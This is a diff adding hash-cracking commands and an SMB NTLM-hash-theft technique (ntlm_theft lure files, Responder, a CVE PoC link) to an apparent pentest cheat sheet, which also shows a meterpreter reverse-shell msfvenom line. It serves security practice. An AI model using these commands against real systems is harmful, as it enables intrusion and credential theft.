@@ -295,9 +295,11 @@ msfvenom -p java/meterpreter/reverse_tcp LHOST=10.10.15.59 LPORT=4443 -f war -o 
 # Upload it and you can click on it in the applciation section . 
 ```
 
-## Cracking Files :
+## Cracking Files/Hashes :
 
 ```bash
+
+** Files **
 ===> XSLX : 
 
 office2john file.xlsx > file.john 
@@ -339,6 +341,13 @@ john --format=NT --wordlist=rockyou.txt hashes.txt
  unshadow pass shadow > unshadow
 john --wordlist=/usr/share/wordlists/rockyou.txt --rules --format=md5crypt-long unshadow
 
+**Active Directory Hashcracking :**
+
+# DCC2 Hashes mode :
+hashcat -m 2100 Helly.DC02 /usr/share/wordlists/rockyou.txt
+
+# TGS with AES 128 :
+hashcat -m 19700 hashesss /usr/share/wordlists/rockyou.txt
 ```
 
 ## PFSense :
@@ -984,7 +993,20 @@ that , check the date of last modifications to be sure of which one to check fir
 ====> Download ALL from SMB 
 recurse on 
 prompt off
-mget * 
+mget *
+
+**Writable Shares :** 
+If we can write into a share always upload a INK file and setup responder , we might be able to capture some Hashes .
+https://github.com/Greenwolf/ntlm_theft
+git clone https://github.com/Greenwolf/ntlm_theft.git
+cd ntlm_theft
+python3 ntlm_theft.py --generate modern --server tun0 --filename "Please_Clickit"    
+
+==> If this doesn't work , this is a recent CVE :
+https://github.com/helidem/CVE-2025-24054_CVE-2025-24071-PoC
+
+==> There is also a module in NXC for this :
+
 
 ```
 
